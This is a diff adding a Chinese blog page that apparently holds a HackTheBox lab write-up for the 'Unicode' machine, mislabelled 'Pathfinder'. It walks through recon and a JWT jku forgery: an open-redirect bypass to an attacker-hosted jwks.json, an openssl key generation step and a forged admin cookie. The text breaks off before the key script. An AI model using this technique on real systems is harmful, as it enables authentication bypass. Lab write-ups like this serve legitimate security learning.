@@ -1,0 +1,1174 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/icon/apple-touch-icon.png">
+  <link rel="icon" href="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/icon/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="何语灵">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="每周练手">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - StartingPoint-Pathfinder">
+<meta property="og:url" content="https://m0ck1ng-b1rd.github.io/2022/05/19/HTB/Unicode/index.html">
+<meta property="og:site_name" content="M0cK1nG-b1Rd&#39;s site">
+<meta property="og:description" content="每周练手">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://picbedddd.oss-cn-beijing.aliyuncs.com/blog/images_modified/8d3e1b5419f74d6ae4c1ac7f2faf949f.png">
+<meta property="article:published_time" content="2022-05-19T10:59:33.000Z">
+<meta property="article:modified_time" content="2022-05-19T11:04:09.051Z">
+<meta property="article:author" content="何语灵">
+<meta property="article:tag" content="HackTheBox">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://picbedddd.oss-cn-beijing.aliyuncs.com/blog/images_modified/8d3e1b5419f74d6ae4c1ac7f2faf949f.png">
+  
+  
+  
+  <title>HackTheBox - StartingPoint-Pathfinder - M0cK1nG-b1Rd&#39;s site</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"m0ck1ng-b1rd.github.io","root":"/","version":"1.9.0","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"87rdYWc7BpvmNHtufVgH6hwF-gzGzoHsz","app_key":"FOGIb6hlzKdTWSp4wBpACnWG","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>M0cK1nG-b1Rd&#39;s site</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/761607.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackTheBox - StartingPoint-Pathfinder"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-05-19 18:59" pubdate>
+          2022年5月19日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          13k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          109 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="HackTheBox"
+        id="heading-d9fb08be3ed131369df5d4aa808dac70" role="tab" data-toggle="collapse" href="#collapse-d9fb08be3ed131369df5d4aa808dac70"
+        aria-expanded="true"
+      >
+        HackTheBox
+        <span class="list-group-count">(16)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-d9fb08be3ed131369df5d4aa808dac70"
+           role="tabpanel" aria-labelledby="heading-d9fb08be3ed131369df5d4aa808dac70">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2021/12/07/HTB/BountyHunter/" title="HackTheBox - BountyHunter"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - BountyHunter</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Cap/" title="HackTheBox - Cap"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Cap</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Driver/" title="HackTheBox - Driver"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Driver</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Horizontall/" title="HackTheBox - Horizontall"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Horizontall</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Intelligence/" title="HackTheBox - Intelligence"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Intelligence</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Monitors/" title="HackTheBox - Monitors"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Monitors</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Previse/" title="HackTheBox - Previse"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Previse</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Schooled/" title="HackTheBox - Schooled"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Schooled</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/13/HTB/Seal/" title="HackTheBox - Seal"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Seal</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2022/04/13/HTB/Shibboleth/" title="HackTheBox - Shibboleth"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Shibboleth</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Sink/" title="HackTheBox - Sink"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Sink</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Spider/" title="HackTheBox - Spider"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Spider</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/StartingPoint-Archetype/" title="HackTheBox - StartingPoint-Archetype"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - StartingPoint-Archetype</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/StartingPoint-Pathfinder/" title="HackTheBox - StartingPoint-Pathfinder"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - StartingPoint-Pathfinder</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2022/05/19/HTB/Unicode/" title="HackTheBox - StartingPoint-Pathfinder"
+           class="list-group-item list-group-item-action
+           active">
+          <span class="category-post">HackTheBox - StartingPoint-Pathfinder</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/dynstr/" title="HackTheBox - dynstr"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - dynstr</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HackTheBox - StartingPoint-Pathfinder</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2022年5月19日 晚上
+                  
+                
+              </p>
+            
+            <div class="markdown-body">
+              
+              <h1 id="0x01-Recon"><a href="#0x01-Recon" class="headerlink" title="0x01 Recon"></a>0x01 Recon</h1><h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sC -sV -v <span class="hljs-number">10.10.11.126</span> <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs coq">PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">8.2</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0<span class="hljs-number">.3</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br>| <span class="hljs-type">ssh</span>-hostkey:<br>|   <span class="hljs-type">3072</span> fd:a0:f7:<span class="hljs-number">93</span>:<span class="hljs-number">9</span>e:d3:cc:bd:c2:<span class="hljs-number">3</span>c:<span class="hljs-number">7</span>f:<span class="hljs-number">92</span>:<span class="hljs-number">35</span>:<span class="hljs-number">70</span>:d7:<span class="hljs-number">77</span> (RSA)<br>|   <span class="hljs-type">256</span> <span class="hljs-number">8</span>b:b6:<span class="hljs-number">98</span>:<span class="hljs-number">2</span>d:fa:<span class="hljs-number">00</span>:e5:e2:<span class="hljs-number">9</span>c:<span class="hljs-number">8</span>f:af:<span class="hljs-number">0</span>f:<span class="hljs-number">44</span>:<span class="hljs-number">99</span>:<span class="hljs-number">03</span>:b1 (ECDSA)<br>|<span class="hljs-type">_</span>  <span class="hljs-number">256</span> c9:<span class="hljs-number">89</span>:<span class="hljs-number">27</span>:<span class="hljs-number">3</span>e:<span class="hljs-number">91</span>:cb:<span class="hljs-number">51</span>:<span class="hljs-number">27</span>:<span class="hljs-number">6</span>f:<span class="hljs-number">39</span>:<span class="hljs-number">89</span>:<span class="hljs-number">36</span>:<span class="hljs-number">10</span>:<span class="hljs-number">41</span>:df:<span class="hljs-number">7</span>c (ED25519)<br><span class="hljs-number">80</span>/tcp open  http    nginx <span class="hljs-number">1.18</span><span class="hljs-number">.0</span> (Ubuntu)<br>|<span class="hljs-type">_http</span>-title: <span class="hljs-number">503</span><br>| <span class="hljs-type">http</span>-methods:<br>|<span class="hljs-type">_</span>  Supported Methods: HEAD GET OPTIONS<br>|<span class="hljs-type">_http</span>-server-header: nginx/<span class="hljs-number">1.18</span><span class="hljs-number">.0</span> (Ubuntu)<br>|<span class="hljs-type">_http</span>-trane-info: Problem <span class="hljs-built_in">with</span> XML parsing of /evox/about<br>Service <span class="hljs-keyword">Info</span>: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure>
+
+<h2 id="站点"><a href="#站点" class="headerlink" title="站点"></a>站点</h2><h3 id="到处看看"><a href="#到处看看" class="headerlink" title="到处看看"></a><strong>到处看看</strong></h3><p>站点看起来是一个威胁情报商业公司的站点，网站最中央有一个非常显眼的按钮。点击按钮会发起重定向访问<code>/redirect/?url=google.com</code>，之后就会经过302跳转转到<code>google.com</code>。</p>
+<p>站点在注册账号和登陆后重定向到<code>/dashboard</code>。首页有三个按钮，看起来中间那个按钮是我们的目标。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220519110000548.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220519110000548"></p>
+<p>同时在界面的底部有一个<code>Powered By flask</code>，大概率这是一个Flask编写的站点。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220519105939309.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220519105939309"></p>
+<p>第一个按钮定位到<code>/pricing</code>，没啥用。第二个按钮定位到<code>/upload</code>，看起来是一个文件上传的绕过。但是Flask并没有文件上传相关的漏洞，同时文件上传的后缀也被限制在了pdf，同时上传成功了并没有读取的界面，看起来这里并不能利用。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220519110344446.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220519110344446"></p>
+<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a><strong>目录扫描</strong></h3><p>目录扫描没有找到有用的结果，这里就不放出来了。</p>
+<h3 id="架构分析"><a href="#架构分析" class="headerlink" title="架构分析"></a><strong>架构分析</strong></h3><p>虽然网站功能本身并没有太多有意思的点，但是抓包能够发现网站使用了jwt作为验证手段。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220519111007635.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220519111007635"></p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220519105356482.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220519105356482"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ</span>.eyJ1c2VyIjoiYWRtaW4yIn0.E48Ev307FZKerAanbwLSKHXe_c_Y2axUe_K37bCMlTrDpgPGswjiGcMn7ycdAcSQwg1GgIGi23AE1IxvK6iROO2xRmPG71NTLYrXDCkUxZlq-VHFR-<span class="hljs-number">6</span>cCiWddmc-OlRgDK3-RErCFy47AtL4kODl1h9BlKtEXAmftXd3awfFTkfDU1SVqFddhsCn-Dl8ttZILkf4qHXHeD7-<span class="hljs-number">3</span>mk5hjOzHPxi7ez3sei_CRHURQByXj0unjPfJxRJDCNIIZizRAiCpTbG3qyDBbgzjmxJySjMziwrdB0f1vHx-<span class="hljs-number">1</span>cNUVhTBozlzPQx8OsRrcluA9TkXq8jabDQUnItQe91lOb4ufgS1g<br></code></pre></td></tr></table></figure>
+
+
+
+<p>放到<code>jwt.io</code>里解析一下，发现和经常碰到的jwt加密方式不一样，比较常见的jwt header中，alg字段是<code>HS256</code>，这里是<code>RS256</code>，然后有一个不太熟悉的字段<code>jku</code>。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220516134433155.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220516134433155"></p>
+<h3 id="JKU利用"><a href="#JKU利用" class="headerlink" title="JKU利用"></a>JKU利用</h3><p>访问文件<a target="_blank" rel="noopener" href="http://hackmedia.htb/static/jwks.json%EF%BC%8C%E8%83%BD%E5%A4%9F%E5%8F%91%E7%8E%B0%E4%B8%80%E4%BA%9Bemm...%EF%BC%8C%E7%9C%8B%E4%B8%8D%E6%87%82%E7%9A%84%E4%BF%A1%E6%81%AF%E3%80%82">http://hackmedia.htb/static/jwks.json，能够发现一些emm...，看不懂的信息。</a></p>
+<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&#123;<br>    <span class="hljs-string">&quot;keys&quot;</span>: [<br>        &#123;<br>            <span class="hljs-string">&quot;kty&quot;</span>: <span class="hljs-string">&quot;RSA&quot;</span>,<br>            <span class="hljs-string">&quot;use&quot;</span>: <span class="hljs-string">&quot;sig&quot;</span>,<br>            <span class="hljs-string">&quot;kid&quot;</span>: <span class="hljs-string">&quot;hackthebox&quot;</span>,<br>            <span class="hljs-string">&quot;alg&quot;</span>: <span class="hljs-string">&quot;RS256&quot;</span>,<br>            <span class="hljs-string">&quot;n&quot;</span>: <span class="hljs-string">&quot;AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju-UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF_DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs&quot;</span>,<br>            <span class="hljs-string">&quot;e&quot;</span>: <span class="hljs-string">&quot;AQAB&quot;</span><br>        &#125;<br>    ]<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们可以尝试搜索一下jwks.json这个文件名，总之最后找到下面两个有用的帖子。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//i</span>nfosecwriteups.com/attacking-json-web-tokens-jwts-d1d51a1e17cb<br>https:<span class="hljs-regexp">//</span>www.anquanke.com<span class="hljs-regexp">/post/i</span>d/<span class="hljs-number">236830</span><br></code></pre></td></tr></table></figure>
+
+<p>在安全客那篇帖子中对可用的攻击方式做了很好的总结。我们先尝试一下随便修改<code>jku</code>指向我们的服务器地址，如<code>&quot;jku&quot;:&quot;http://10.10.16.4/jwks.json&quot;</code>，发现返回报错。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220516135451161.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220516135451161"></p>
+<p>但是同时我们的机子上并没有显示服务器的访问信息。可以断定是程序逻辑本身对<code>jku</code>作了前缀限制。按照帖子中提到的方法，我们可以使用重定位的方式绕过限制，原因是在之前我们发现了一个重定位的链接<code>/redirect</code>。</p>
+<p>直接使用 <a target="_blank" rel="noopener" href="http://hackmedia.htb/redirect/?url=10.10.16.2/jwks.json%E4%B8%8D%E8%A1%8C%E3%80%82">http://hackmedia.htb/redirect/?url=10.10.16.2/jwks.json不行。</a></p>
+<p>进一步尝试发现<a target="_blank" rel="noopener" href="http://hackmedia.htb/redirect/?url=10.10.16.2/jwks.json">http://hackmedia.htb/static/../redirect/?url=10.10.16.2/jwks.json</a> 可以。</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs coq">➤  echo &#x27;&#123;<span class="hljs-string">&quot;typ&quot;</span>:<span class="hljs-string">&quot;JWT&quot;</span>,<span class="hljs-string">&quot;alg&quot;</span>:<span class="hljs-string">&quot;RS256&quot;</span>,<span class="hljs-string">&quot;jku&quot;</span>:<span class="hljs-string">&quot;http://hackmedia.htb/static/../redirect/?url=10.10.16.4/jwks.json&quot;</span>&#125;&#x27; | <span class="hljs-type">base64</span> -w0<br>eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8/dXJsPTEwLjEwLjE2LjQvandrcy5qc29uIn0<br></code></pre></td></tr></table></figure>
+
+<p>替换Cookie后刷新，能够在本机上看到服务器的访问记录。</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">➤  python3 -m http.server <span class="hljs-number">80</span><br>Serving HTTP on <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> port <span class="hljs-number">80</span> (http://<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">80</span>/) ...<br><span class="hljs-number">10.10.11.126</span> - - <span class="hljs-string">[16/May/2022 14:03:02]</span> code <span class="hljs-number">404</span>, message File not found<br><span class="hljs-number">10.10.11.126</span> - - <span class="hljs-string">[16/May/2022 14:03:02]</span> <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> /jwks.json HTTP/1.1&quot;</span> <span class="hljs-number">404</span> -<br></code></pre></td></tr></table></figure>
+
+<p>为了能够达到伪造token，首先需要伪造auth cookie。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">openssl genrsa -out keypair.pem 2048	<span class="hljs-comment">#产生私钥</span><br>openssl rsa -<span class="hljs-keyword">in</span> keypair.pem -pubout -out public.crt	<span class="hljs-comment">#产生公钥</span><br></code></pre></td></tr></table></figure>
+
+<p>之后将公私钥文件内容分别贴入签名部分。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220519120453346.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220519120453346"></p>
+<p>于我而言，得到了如下Cookie。</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">eyJ<span class="hljs-number">0</span>eXAiOiJKV<span class="hljs-number">1</span>QiLCJhbGciOiJSUzI<span class="hljs-number">1</span>NiIsImprdSI<span class="hljs-number">6</span>Imh<span class="hljs-number">0</span>dHA<span class="hljs-number">6</span>Ly<span class="hljs-number">9</span>oYWNrbWVkaWEuaHRiL<span class="hljs-number">3</span>N<span class="hljs-number">0</span>YXRpYy<span class="hljs-number">8</span>uLi<span class="hljs-number">9</span>yZWRpcmVjdC<span class="hljs-number">8</span>_dXJsPTEwLjEwLjE<span class="hljs-number">2</span>LjQvandrcy<span class="hljs-number">5</span>qc<span class="hljs-number">29</span>uIn<span class="hljs-number">0</span>.eyJ<span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span>VyIjoiYWRtaW<span class="hljs-number">4</span>ifQ.vkKhZyZ<span class="hljs-number">7</span>NTaiJSZSJI<span class="hljs-number">3</span>pT<span class="hljs-number">1</span>pknITQRVgRFKnQ<span class="hljs-number">0</span>RN<span class="hljs-number">4</span>I_owpB<span class="hljs-number">6e25</span>_lFQEekoqO<span class="hljs-number">61</span>uA<span class="hljs-number">0</span>Et<span class="hljs-number">8</span>qGocxYUg<span class="hljs-number">5e79</span>LSx<span class="hljs-number">1</span>Uwa<span class="hljs-number">0</span>B<span class="hljs-number">7</span>uVVNOld<span class="hljs-number">1</span>A<span class="hljs-number">6</span>QiVEC<span class="hljs-number">06</span>XBYkJ<span class="hljs-number">22</span>FE<span class="hljs-number">1</span>Qxe<span class="hljs-number">7</span>xK-xRBMY<span class="hljs-number">2</span>fHXFH<span class="hljs-number">49</span>fTYSS<span class="hljs-number">4</span>V_wQNP_iLD<span class="hljs-number">1</span>xu<span class="hljs-number">7</span>NLxQlN<span class="hljs-number">9</span>hLCCaQiW-iJlP<span class="hljs-number">96</span>j<span class="hljs-number">1</span>axOtE<span class="hljs-number">5</span>zBBPHFGzh<span class="hljs-number">8</span>LU<span class="hljs-number">5</span>G<span class="hljs-number">4</span>TTH_<span class="hljs-number">9</span>lrDQpgg<span class="hljs-number">7</span>jeITO<span class="hljs-number">06</span>ZMvanuGTJ<span class="hljs-number">7</span>ijgyEMinUJOsOs-SGHzcf<span class="hljs-number">6</span>vtOA<span class="hljs-number">8</span>kPd_jbp_Bgf<span class="hljs-number">0</span>JgKkJFNDHE-V<span class="hljs-number">3</span>GoucATG<span class="hljs-number">625</span>NXaOGkRXu<span class="hljs-number">7</span>PM<span class="hljs-number">0</span>KXnZJMzfBLcHZlIR<span class="hljs-number">3</span>o<span class="hljs-number">4</span>G<span class="hljs-number">4</span>pT<span class="hljs-number">5</span>Lw<span class="hljs-number">2</span>jy<span class="hljs-number">72</span>m<span class="hljs-number">3</span>Nw<br></code></pre></td></tr></table></figure>
+
+<p>接下来就是构造我们的<code>jwks.json</code>了。使用如下脚本生成<code>jwks.json</code>中的n、e值。</p>
